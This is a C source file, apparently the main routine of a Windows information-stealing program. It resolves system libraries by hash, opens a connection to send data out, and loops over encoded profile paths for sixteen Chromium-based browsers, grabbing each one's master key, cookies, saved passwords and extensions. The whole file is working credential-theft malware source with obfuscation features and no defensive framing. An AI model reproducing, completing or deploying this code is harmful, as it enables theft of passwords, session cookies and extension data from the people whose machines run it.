#include "../include/ExtensionsGrabber.h"
#include "../include/AddrResolution.h"
#include "../include/BrowserGrabber.h"
#include "../include/DirectoryOps.h"
#include "../include/StringUtils.h"
#include "../include/MasterKeyGrabber.h"
#include "../include/PathOps.h"
#include "../include/SendData.h"
#include "../include/decoding.h"
#include "../include/macros.h"
#include "../include/global.h"
#include "../include/MemoryUtils.h"

#include <windows.h>

#define BROWSERS 15

GlobalsContainer    global            = {0};

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd) {
    HANDLE              FolderHandle      = {0};
    unsigned short      FolderPath[256]   = {0};
    int                 idx               = 0;

    SetMemory((void*)&global, 0, sizeof(GlobalsContainer));
    global.NtDll = GetDllAddress((HashInfo){NTDLL, 9});

    if (InitConnection() == -1) {
        return 1;
    }

    unsigned short paths[][80] = {
        CRYPTOTAB_BROWSER,
        AMIGO,
        TORCH,
        KOMETA,
        ORBITUM,
        CENTBROWSER,
        SPUTNIK,
        VIVALDI,
        EPIC_PRIVACY_BROWSER,
        MICROSOFT,
        UCOZMEDIA,
        YANDEX,
        BRAVESOFTWARE,
        IRIDIUM,
        CHROME_SXS,
        CHROME
    };

    while (idx <= BROWSERS) {
        DecodeStringW(paths[idx]);
        InitPath(paths[idx], FolderPath);
        if (OpenFolder(&FolderHandle, FolderPath) == 0) {
            GrabMasterKey(FolderPath);
            GrabCookies(FolderPath);
            GrabPasswords(FolderPath);
            GrabExtensions(FolderPath);
        }
        idx++;
    }

    return 0;
}